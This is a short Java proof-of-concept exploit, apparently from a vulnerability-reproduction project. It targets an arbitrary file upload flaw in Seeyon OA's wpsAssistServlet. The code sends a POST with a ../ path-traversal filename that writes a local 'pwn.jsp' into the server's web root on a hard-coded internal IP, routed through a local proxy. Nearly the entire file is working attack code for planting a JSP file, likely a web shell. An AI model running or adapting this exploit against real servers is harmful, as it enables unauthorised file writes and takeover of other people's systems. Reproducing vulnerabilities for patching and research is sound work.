package cve;

import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import org.apache.http.client.methods.HttpPost;

import java.io.IOException;

/**
 * WPS任意文件上传&读取漏洞
 * http://service.seeyon.com/patchtools/tp.html#/patchList?type=%E5%AE%89%E5%85%A8%E8%A1%A5%E4%B8%81&id=119
 */
public class FileUpload_20220719 {

    public static void main(String[] args) throws IOException {

        String url = "http://10.58.120.201/seeyon/wpsAssistServlet?flag=save&fileId=1&realFileType=../../../../ApacheJetspeed/webapps/ROOT/pwn.jsp";
        HttpPost httpPost = new HttpPost(url);

        String filePath = "D:\\tmp\\pwn.jsp";
        HttpRequest httpRequest = new HttpRequest("127.0.0.1",8080);
        httpRequest.sendFormFilePost(httpPost, filePath);
    }
}
